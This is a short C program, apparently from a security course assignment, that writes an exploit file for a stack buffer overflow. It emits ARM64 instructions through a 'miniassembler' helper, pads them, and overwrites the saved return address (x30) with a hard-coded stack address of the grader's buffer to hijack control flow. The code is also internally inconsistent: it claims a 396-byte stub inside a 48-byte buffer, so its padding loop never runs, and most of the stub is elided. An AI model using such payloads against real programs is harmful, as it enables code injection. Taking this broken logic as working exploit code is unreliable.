#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *f = fopen("dataA","wb");
    unsigned long pc = 0;
    unsigned int instr;
    unsigned long buffAddr;
    int i;

    /* 1) Emit your 99-instr stub *into the buffer* */
    instr = MiniAssembler_adr(1, /* imm = */ 396, pc);  
    fwrite(&instr,4,1,f); pc+=4;
    /* … the rest of your MOV/ADR/STRB loops … */
    instr = MiniAssembler_b(0x400890UL, /* branch_pc= */392);
      
    fwrite(&instr,4,1,f); pc+=4;
    /* Now pc==396 bytes exactly */

    /* 2) Pad out the rest of the 48-byte buffer if your stub < 48 bytes */
    for (; pc < 48; pc += 4) {
      /* pick any 4-byte helper output, e.g. MOV W0,0 → 0x52800000 */
      instr = MiniAssembler_mov(0,0);
      fwrite(&instr,4,1,f);
    }

    /* 3) Overwrite saved x30 with the *address of the buffer* */
    /*    Suppose the grader’s buf[] lives at 0x7fffffffe220 in its stack */
    buffAddr = 0x7fffffffe220UL;
    fwrite(&buffAddr, sizeof buffAddr, 1, f);

    fclose(f);
    return 0;
}
